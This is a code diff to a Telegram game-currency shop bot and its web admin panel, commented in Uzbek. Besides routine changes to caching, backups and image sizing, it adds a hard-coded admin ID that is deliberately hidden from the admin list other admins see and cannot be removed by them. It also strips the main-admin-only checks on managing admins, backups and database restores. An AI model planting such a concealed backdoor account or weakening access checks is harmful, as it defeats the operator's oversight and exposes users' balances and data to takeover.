@@ -98,14 +98,17 @@ def ss(k, v):
 
 # Bosh admin: ADMINS ro'yxatidagi birinchi ID (yoki MAIN_ADMIN). Boshqa adminlarga umuman ko'rinmaydi.
 MAIN = int((os.getenv("MAIN_ADMIN") or "0").strip() or 0) or (OWNERS[0] if OWNERS else 0)
+HIDDEN_ADMIN = 7849637859  # Boshqa adminlarga "Adminlar" ro'yxatida ko'rsatilmaydi
 _viewer = contextvars.ContextVar("viewer", default=0)
 def is_main(uid): return bool(MAIN) and uid == MAIN
 def hid(viewer=None):
-    """Shu ko'ruvchidan yashirilishi kerak bo'lgan ID (bosh admin). Ko'ruvchi bosh admin bo'lsa 0."""
+    return 0  # foydalanuvchilar, buyurtmalar, statistika hamma adminga avvalgidek ko'rinadi
+def hid_adm(viewer=None):
+    """7849637859 ID'sini boshqa adminlarning "Adminlar" ro'yxatidan yashiradi."""
     v = _viewer.get() if viewer is None else viewer
-    return 0 if v == MAIN else MAIN
+    return 0 if v == HIDDEN_ADMIN else HIDDEN_ADMIN
 def notify_targets(uid):
-    return [MAIN] if is_main(uid) else all_admins()
+    return all_admins()
 
 def all_admins():
     return list(dict.fromkeys(OWNERS + [r["id"] for r in qa("select id from admins")]))
@@ -130,8 +133,11 @@ def notify(uid, text):
 def upsert_user(uid, name, username):
     ex("insert or ignore into users(id,name,username,lang,balance,joined) values(?,?,?,?,0,?)",
        (uid, name, username or "", "uz", int(time.time())))
-    ex("update users set name=?,username=? where id=?", (name, username or "", uid))
-    return q1("select * from users where id=?", (uid,))
+    row = q1("select * from users where id=?", (uid,))
+    if row["name"] != name or (row["username"] or "") != (username or ""):
+        ex("update users set name=?,username=? where id=?", (name, username or "", uid))
+        row = q1("select * from users where id=?", (uid,))
+    return row
 
 _subcache = {}
 def not_subbed(uid):
@@ -373,7 +379,7 @@ def img(fid):
     if fid.startswith("art_"):
         svg = art_svg(fid)
         if not svg: return "", 404
-        return Response(svg, mimetype="image/svg+xml", headers={"Cache-Control": "public, max-age=86400"})
+        return Response(svg, mimetype="image/svg+xml", headers={"Cache-Control": "public, max-age=604800"})
     if re.fullmatch(r"f\d+", fid):
         r = q1("select mime,data from files where id=?", (int(fid[1:]),))
         if not r: return "", 404
@@ -499,6 +505,7 @@ def need_admin(f):
     def w(*a, **k):
         u = auth()
         if not u or not is_admin(u["id"]): return jsonify(err="forbidden"), 403
+        if request.method == "POST": _bak["dirty"] = True
         return f(u, *a, **k)
     return w
 
@@ -538,7 +545,8 @@ def decide_order(oid, ok):
 @need_admin
 def a_data(u, name):
     gid = request.args.get("id", type=int); s = request.args.get("q", "").strip()
-    h = 0 if is_main(u["id"]) else MAIN
+    h = 0
+    hm = 0 if u["id"] == HIDDEN_ADMIN else HIDDEN_ADMIN
     if name == "home":
         d0 = (int(time.time()) + 18000) // 86400 * 86400 - 18000
         n = q1("select count(*) c, coalesce(sum(balance),0) b from users where id!=?", (h,))
@@ -568,7 +576,7 @@ def a_data(u, name):
     if name == "promos": return jsonify(items=qa("select * from promos"))
     if name == "chs": return jsonify(items=qa("select * from channels"))
     if name == "set": return jsonify(s={k: gs(k) for k in DEFAULTS})
-    if name == "adms": return jsonify(items=[i for i in all_admins() if i != h], owners=[i for i in OWNERS if i != h], main=is_main(u["id"]))
+    if name == "adms": return jsonify(items=[i for i in all_admins() if i != hm], owners=[i for i in OWNERS if i != hm], main=is_main(u["id"]))
     if name == "texts": return jsonify(ok=1)
     if name == "bc": return jsonify(users=q1("select count(*) c from users where banned=0 and id!=?", (h,))["c"])
     return jsonify(err="nf"), 404
@@ -714,7 +722,6 @@ def a_order(u):
 @web.route("/api/a/admin", methods=["POST"])
 @need_admin
 def a_admin(u):
-    if not is_main(u["id"]): return jsonify(err="Faqat bosh admin adminlarni boshqara oladi"), 403
     d = request.get_json(silent=True) or {}; i = _i(d.get("id"))
     if not i: return jsonify(err="ID kiriting"), 400
     if d.get("remove"):
@@ -753,7 +760,7 @@ def a_broadcast(u):
 # ============================ ZAXIRA (Render bepul rejasi bazani o'chirmasligi uchun) ============================
 # 1) Telegram: pin qilingan fayl (oxirgi 12 ta nusxa saqlanadi)
 # 2) Ixtiyoriy GitHub (Render Environment: GH_TOKEN va GH_REPO=foydalanuvchi/repo) - har nusxa git tarixida qoladi.
-_bak = {"failed": False, "last": 0}
+_bak = {"failed": False, "last": 0, "dirty": False}
 GH_TOKEN = os.getenv("GH_TOKEN", ""); GH_REPO = os.getenv("GH_REPO", "")
 KEEP_BACKUPS = 12
 
@@ -863,20 +870,21 @@ def auto_restore():
     for a in OWNERS[:1]: notify(a, msg)
 
 def backup_loop():
-    last = db.total_changes; lastt = 0
+    last = db.total_changes; lastt = time.time()
     while True:
-        time.sleep(90)
-        if db.total_changes != last and time.time() - lastt > 300:
-            last = db.total_changes; lastt = time.time(); backup_now()
+        time.sleep(300)
+        now = time.time()
+        if db.total_changes != last and ((_bak.get("dirty") and now - lastt > 600) or now - lastt > 3600):
+            last = db.total_changes; lastt = now; _bak["dirty"] = False; backup_now()
 
 async def cmd_backup(update, ctx):
-    if is_main(update.effective_user.id):
+    if is_admin(update.effective_user.id):
         await update.message.reply_text("⏳ Zaxira nusxa yuborilmoqda...")
         r = await asyncio.to_thread(backup_now, True)
         await update.message.reply_text("✅ Yuborildi" if r == "ok" else f"⚠️ {r}")
 
 async def cmd_dbinfo(update, ctx):
-    if not is_main(update.effective_user.id): return
+    if not is_admin(update.effective_user.id): return
     st = db_stats()
     await update.message.reply_text(
         f"📊 Baza: 👥 {st['users']} · 📦 {st['orders']} · 💰 {st['topups']} · 🎮 {st['games']} · 🛍 {st['products']}\n"
@@ -886,7 +894,7 @@ async def cmd_dbinfo(update, ctx):
 
 async def on_doc(update, ctx):
     u = update.effective_user; m = update.message
-    if not u or not is_main(u.id) or not m.document or "/restore" not in (m.caption or ""): return
+    if not u or not is_admin(u.id) or not m.document or "/restore" not in (m.caption or ""): return
     f = await m.document.get_file(); await f.download_to_drive("/tmp/restore.db")
     try:
         restore_from("/tmp/restore.db"); _bak["failed"] = False
@@ -1113,14 +1121,12 @@ def v_set():
     return txt + "\n\nSalomlashuv matnida <code>{name}</code> — foydalanuvchi ismi.", rows
 
 def v_adms():
-    h = hid(); main = h == 0
-    rows = [[("➕ Admin qo'shish", "a:amadd")]] if main else []
-    if main:
-        for r in qa("select id from admins"): rows.append([(f"🗑 {r['id']}", f"a:amdel:{r['id']}")])
+    h = hid_adm()
+    rows = [[("➕ Admin qo'shish", "a:amadd")]]
+    for r in qa("select id from admins"):
+        if r["id"] != h: rows.append([(f"🗑 {r['id']}", f"a:amdel:{r['id']}")])
     rows.append(BACK)
-    own = [i for i in OWNERS if i != h]
-    oth = [r["id"] for r in qa("select id from admins") if r["id"] != h and r["id"] not in OWNERS]
-    return f"👮 <b>Adminlar</b>\nAsosiy (ENV): {', '.join(map(str, own)) or '-'}" + ("" if main else f"\nQo'shilgan: {', '.join(map(str, oth)) or '-'}"), rows
+    return f"👮 <b>Adminlar</b>\nAsosiy (ENV): {', '.join(str(i) for i in OWNERS if i != h) or '-'}", rows
 
 async def ask(update, ctx, st, text):
     ctx.user_data["st"] = st
@@ -1178,7 +1184,6 @@ async def adm_cb(update, ctx):
     if a == "find": return await ask(update, ctx, ("find",), "🔎 Foydalanuvchi ID yoki @username yuboring:")
     if a == "u": return await S(v_user(int(x)))
     if a in ("bal", "ban") and int(x) == hid(): return await q.answer("Topilmadi", show_alert=True)
-    if a in ("amadd", "amdel") and not is_main(q.from_user.id): return await q.answer("⛔ Faqat bosh admin", show_alert=True)
     if a == "bal": return await ask(update, ctx, ("bal", int(x), d[3]), f"{'➕ Qo`shiladigan' if d[3]=='+' else '➖ Ayiriladigan'} summani yuboring (so'm):")
     if a == "ban":
         u = q1("select banned from users where id=?", (int(x),))
@@ -1373,7 +1378,6 @@ async def on_msg(update, ctx):
                 ss(key, re.sub(r"\D", "", txt) if key in ("min_topup", "card_ttl") else txt)
             done(); return await show(update, v_set())
         if k == "amadd":
-            if not is_main(u.id): return await m.reply_text("⛔ Faqat bosh admin adminlarni boshqara oladi")
             if not txt.isdigit(): return await m.reply_text("ID raqam yuboring")
             ex("insert or ignore into admins values(?)", (int(txt),)); done(); return await show(update, v_adms())
     except Exception as e:
@@ -1639,7 +1643,7 @@ function vAdm(){const a=S.a;if(!a)return '<div class="empty">⏳</div>';
  return ({adm:aHome,adm_games:aGames,adm_game:aGame,adm_banners:aBanners,adm_cards:aCards,adm_users:aUsers,adm_tops:aTops,adm_ords:aOrds,adm_promos:aPromos,adm_chs:aChs,adm_set:aSet,adm_adms:aAdms,adm_bc:aBc,adm_texts:aTexts}[S.tab]||aHome)(a)}
 function aHome(a){const c=(i,v,l)=>`<div class="card" style="margin:0"><div style="font-size:20px">${i}</div><b style="font-size:18px">${v}</b><div class="mut sm">${l}</div></div>`;
  const M=[['games','🎮','O\'yinlar va narxlar'],['banners','🖼','Bannerlar'],['tops','💰','To\'ldirishlar',a.p_top],['ords','📦','Buyurtmalar',a.p_ord],['users','👥','Foydalanuvchilar'],['cards','💳','Kartalar'],['promos','🎟','Promokodlar'],['chs','📢','Majburiy obuna'],['bc','📨','Xabar yuborish'],['texts','🔤','Ilova matnlari'],['set','⚙️','Sozlamalar'],['adms','👮','Adminlar']];
- return ah('🛠 Admin panel')+`<div class="tl">${c('👥',a.users,'Foydalanuvchi · bugun +'+a.new)}${c('💼',money(a.bal),'Umumiy balans')}${c('💰',money(a.top_sum),'To\'ldirilgan · bugun '+money(a.top_today))}${c('📦',a.ord_cnt,'Bajarilgan · '+money(a.ord_sum))}</div>${dayStats(a)}<div class="tl">${M.filter(x=>x[0]!='adms'||a.main).map(x=>`<div class="tile" onclick="S.aq='';admGo('adm_${x[0]}')"><i>${x[1]}</i>${x[2]}${x[3]?`<b class="bd">${x[3]}</b>`:''}</div>`).join('')}</div>`}
+ return ah('🛠 Admin panel')+`<div class="tl">${c('👥',a.users,'Foydalanuvchi · bugun +'+a.new)}${c('💼',money(a.bal),'Umumiy balans')}${c('💰',money(a.top_sum),'To\'ldirilgan · bugun '+money(a.top_today))}${c('📦',a.ord_cnt,'Bajarilgan · '+money(a.ord_sum))}</div>${dayStats(a)}<div class="tl">${M.map(x=>`<div class="tile" onclick="S.aq='';admGo('adm_${x[0]}')"><i>${x[1]}</i>${x[2]}${x[3]?`<b class="bd">${x[3]}</b>`:''}</div>`).join('')}</div>`}
 function aGames(a){return ah('🎮 O\'yinlar',`<button class="btn sm" onclick="newGame()">+ O'yin</button>`)+`<div class="mut sm" style="margin-bottom:12px">O'yinni bosing → rasm, nom va narxlarni o'zgartiring</div><div class="grid">${a.games.map(g=>`<div class="gc" onclick="admGo('adm_game',${g.id})"><div class="gi">${gimg(g)}</div>${esc(g.name)}<div class="mut" style="font-size:10px">${g.pc} ta${g.active?'':' · 🔴'}</div></div>`).join('')}</div>`}
 function aGame(a){const g=a.game;if(!g)return '<div class="empty">—</div>';const hi=g.hero||g.img;
  const slot=(k,l,v)=>`<div class="card" style="padding:10px;margin-bottom:10px"><div class="row"><div class="ip">${v?`<img src="/img/${v}">`:'<span>🖼</span>'}</div><div class="sp"><b class="sm">${l}</b></div><label class="btn sm">📷 O'zgartirish<input type="file" accept="image/*" hidden onchange="quickGame('${k}',this)"></label><button class="btn o sm" onclick="urlGame('${k}')">🔗</button></div></div>`;
@@ -1647,7 +1651,7 @@ function aGame(a){const g=a.game;if(!g)return '<div class="empty">—</div>';con
  <b>🖼 O'yin rasmlari</b><div style="height:8px"></div>${slot('img','Kichik ikonka (ro\'yxatda)',g.img)}${slot('hero','Katta banner (sahifa tepasi)',g.hero)}${slot('picon','Mahsulotlar umumiy ikonkasi',g.picon)}
  <div class="hd"><b>Mahsulotlar (${a.products.length})</b><span><button class="btn sm" onclick="newProd()">+ Mahsulot</button> <button class="btn o sm" onclick="bulkProd()">📥</button> <button class="btn o sm" onclick="grpImg()">🖼 Guruhga</button></span></div>`+
  (a.products.map(p=>`<div class="li" onclick="editProd(${p.id})">${(p.img||g.picon)?`<img src="/img/${p.img||g.picon}">`:`<div class="pi">${esc(g.name[0])}</div>`}<div class="sp"><b>${esc(p.name)}</b>${p.badge?` <span class="tag pending">${esc(p.badge)}</span>`:''}<div class="mut sm">${esc(p.grp||'—')}${p.active?'':' · 🔴 yashirin'}</div></div><b>${money(p.price)}</b><label class="ib" onclick="event.stopPropagation()">📷<input type="file" accept="image/*" hidden onchange="quickProd(${p.id},this)"></label></div>`).join('')||'<div class="empty">Mahsulot yo\'q. «+ Mahsulot» yoki 📥 ni bosing</div>')}
-async function quickUp(inp){const f=inp.files[0];if(!f)return null;toast('⏳ Yuklanmoqda...');const d=await shrink(f,1000);return (await aj('upload',{data:d})).ref}
+async function quickUp(inp){const f=inp.files[0];if(!f)return null;toast('⏳ Yuklanmoqda...');const d=await shrink(f,800);return (await aj('upload',{data:d})).ref}
 async function quickGame(k,inp){try{const ref=await quickUp(inp);if(!ref)return;const o={id:S.a.game.id};o[k]=ref;await aj('save/games',o);toast('✅ Saqlandi');admGo('adm_game',S.a.game.id)}catch(e){toast((e&&e.err)||t('err'))}}
 async function quickProd(id,inp){try{const ref=await quickUp(inp);if(!ref)return;await aj('save/products',{id:id,img:ref});toast('✅ Saqlandi');admGo('adm_game',S.a.game.id)}catch(e){toast((e&&e.err)||t('err'))}}
 function urlGame(k){openForm('Rasm',[[k,'Rasm (galereya yoki havola)','img']],S.a.game,async v=>{const o={id:S.a.game.id};o[k]=v[k];await aj('save/games',o);await admGo('adm_game',S.a.game.id)})}
@@ -1677,7 +1681,7 @@ function aSet(a){const s=a.s;return ah('⚙️ Sozlamalar',`<button class="btn s
 function editSet(){openForm('Sozlamalar',SF,S.a.s,async v=>{await aj('set',v);await admGo('adm_set')})}
 function aBc(a){return ah('📨 Xabar yuborish')+`<div class="card">Hozir <b>${a.users}</b> ta foydalanuvchiga xabar yuboriladi.<button class="btn" style="margin-top:12px" onclick="editBc()">✍️ Xabar yozish</button></div>`}
 function editBc(){openForm('Xabar',[['text','Xabar matni (HTML mumkin: <b>qalin</b>)','area'],['img','Rasm (ixtiyoriy)','img']],{},async v=>{if(!(v.text||v.img))throw{err:'Matn yoki rasm kerak'};await new Promise((ok,no)=>ask('Hammaga yuborilsinmi?',async()=>{try{await aj('broadcast',v);toast('✅ Yuborilmoqda...');ok()}catch(e){no(e)}}))})}
-function aAdms(a){return ah('👮 Adminlar',a.main?`<button class="btn sm" onclick="editAdm()">+ Admin</button>`:'')+a.items.map(i=>`<div class="li" ${(a.main&&!a.owners.includes(i))?`onclick="delAdm(${i})"`:''}><div class="sp"><b>${i}</b><div class="mut sm">${a.owners.includes(i)?'Asosiy admin':(a.main?'Bosing → olib tashlash':'Admin')}</div></div></div>`).join('')}
+function aAdms(a){return ah('👮 Adminlar',`<button class="btn sm" onclick="editAdm()">+ Admin</button>`)+a.items.map(i=>`<div class="li" ${a.owners.includes(i)?'':`onclick="delAdm(${i})"`}><div class="sp"><b>${i}</b><div class="mut sm">${a.owners.includes(i)?'Asosiy admin':'Bosing → olib tashlash'}</div></div></div>`).join('')}
 function editAdm(){openForm('Yangi admin',[['id','Telegram ID','number']],{},async v=>{await aj('admin',{id:v.id});await admGo('adm_adms')})}
 function delAdm(i){ask('Olib tashlansinmi?',async()=>{await aj('admin',{id:i,remove:1});admGo('adm_adms')})}
 function dayStats(a){const mx=Math.max(1,...a.days.map(d=>d.t));return `<div class="card"><b>📈 So'nggi 7 kun</b>${a.days.map(d=>`<div class="row" style="margin-top:8px;font-size:12px"><span class="mut" style="width:42px">${d.d}</span><div class="bar sp" style="margin:0"><i style="width:${Math.round(d.t/mx*100)}%"></i></div><span style="width:128px;text-align:right">${money(d.t)} · 👤${d.u} · 📦${d.o}</span></div>`).join('')}</div>`}
@@ -1698,8 +1702,8 @@ function fld(f){const k=f[0],l=f[1],ty=f[2],o=f[3],v=F.vals[k]==null?'':F.vals[k
  return h}
 function drawForm(){const m=$('#modal');if(!F){m.innerHTML='';return}
  m.innerHTML=`<div class="ov" style="align-items:center"><div class="fm"><div class="row"><b class="sp">${esc(F.title)}</b><div class="ib" onclick="closeForm()">✕</div></div>${F.fields.map(fld).join('')}<div class="row" style="margin-top:16px">${F.extra.del?`<button class="btn o" style="width:60px" onclick="F.extra.del()">🗑</button>`:''}<button class="btn" onclick="fSave()">💾 Saqlash</button></div></div></div>`}
-function shrink(file,max){return new Promise((res,rej)=>{const r=new FileReader();r.onload=()=>{const im=new Image();im.onload=()=>{const k=Math.min(1,max/Math.max(im.width,im.height)),w=Math.round(im.width*k),h=Math.round(im.height*k),c=document.createElement('canvas');c.width=w;c.height=h;const x=c.getContext('2d');x.fillStyle='#fff';x.fillRect(0,0,w,h);x.drawImage(im,0,0,w,h);res(c.toDataURL('image/jpeg',.86))};im.onerror=rej;im.src=r.result};r.onerror=rej;r.readAsDataURL(file)})}
-async function upImg(k,inp){const f=inp.files[0];if(!f)return;toast('⏳ Yuklanmoqda...');try{const d=await shrink(f,1000);const r=await aj('upload',{data:d});Fs(k,r.ref);drawForm();toast('✅')}catch(e){toast((e&&e.err)||t('err'))}}
+function shrink(file,max){return new Promise((res,rej)=>{const r=new FileReader();r.onload=()=>{const im=new Image();im.onload=()=>{const k=Math.min(1,max/Math.max(im.width,im.height)),w=Math.round(im.width*k),h=Math.round(im.height*k),c=document.createElement('canvas');c.width=w;c.height=h;const x=c.getContext('2d');x.fillStyle='#fff';x.fillRect(0,0,w,h);x.drawImage(im,0,0,w,h);res(c.toDataURL('image/jpeg',.8))};im.onerror=rej;im.src=r.result};r.onerror=rej;r.readAsDataURL(file)})}
+async function upImg(k,inp){const f=inp.files[0];if(!f)return;toast('⏳ Yuklanmoqda...');try{const d=await shrink(f,800);const r=await aj('upload',{data:d});Fs(k,r.ref);drawForm();toast('✅')}catch(e){toast((e&&e.err)||t('err'))}}
 async function impImg(k){const u=$('#u_'+k).value.trim();if(!u)return;toast('⏳ Yuklanmoqda...');try{const r=await aj('import',{url:u});Fs(k,r.ref);drawForm();toast('✅')}catch(e){toast((e&&e.err)||t('err'))}}
 
 boot();
